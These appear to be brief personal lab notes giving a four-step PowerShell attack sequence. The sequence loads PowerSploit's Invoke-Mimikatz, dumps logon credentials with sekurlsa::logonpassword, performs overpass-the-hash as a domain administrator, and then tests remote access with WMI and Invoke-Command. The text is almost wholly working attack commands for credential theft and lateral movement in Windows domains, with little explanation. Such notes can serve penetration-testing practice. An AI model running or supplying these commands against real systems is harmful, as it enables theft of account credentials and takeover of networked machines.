Step 1 : dump credential
`PS > ipmo \powersploit\Exfiltration\Invoke-Mimikatz.ps1
Step 2 : use mimikatz for dump
`PS > invoke-mimikatz -command '"privilege::debug" "sekurlsa::logonpassword"'
Step 3 : OPTH
`PS > invoke-mimikatz -command '"sekurlsa::pth /user:administrator /domain:adolf.local /ntlm:<NTHASH> /run:powershell.exe"'
step 4 : POC
`PS > whoami // not my result that I wanted
`PS > gwmi -Class win32_OperatingSystem -ComputerName mal-analysis 
`PS > icm -ScriptBlock {$env:Computername} -computername adolf.local\mal-analysis